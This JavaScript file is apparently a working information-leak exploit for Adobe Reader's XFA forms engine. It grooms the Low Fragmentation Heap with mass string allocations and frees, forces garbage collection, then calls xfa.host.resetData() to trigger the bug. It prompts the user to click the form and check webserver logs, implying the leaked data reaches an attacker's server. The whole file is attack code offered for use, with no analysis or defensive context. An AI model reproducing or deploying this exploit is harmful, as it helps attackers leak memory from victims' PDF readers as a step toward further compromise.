/**
 * Adobe Reader Information Leak Exploit
 */

var chunks = [];

const groomLFH = (size, count) => {
    var string = unescape("%u4142").repeat(size);

    for (var i = 0; i < count; i++) {
        chunks.push(string.substr(0, (size - 2) / 2).toUpperCase());
    }

    for (var i = 0; i < chunks.length; i += 4) {
        chunks[i] = null;
        delete chunks[i];
    }
};

const triggerGC = () => {
    var string = "GC".repeat(0x100000);

    for (var i = 0; i < 1000; i++) {
        string.substr(0, 0x100000);
    }
};

const exploit = () => {
    xfa.isPropertySpecified("[+] Starting Adobe Reader information leak exploit");

    //
    // Groom the heap
    //

    xfa.isPropertySpecified("[+] Grooming LFH");

    groomLFH(0x58, 30000);

    //
    // Trigger garbage collection
    //

    xfa.isPropertySpecified("[+] Triggering Garbage Collection");

    triggerGC();

    //
    // Reset XFA data which is essential to trigger the bug
    //

    xfa.isPropertySpecified("[+] Resetting XFA data");

    xfa.host.resetData();

    xfa.isPropertySpecified("[+] Now click on the form and check webserver logs");
};

//
// Trigger the exploit
//

try {
    exploit();
} catch (e) {
    app.alert(e);
}
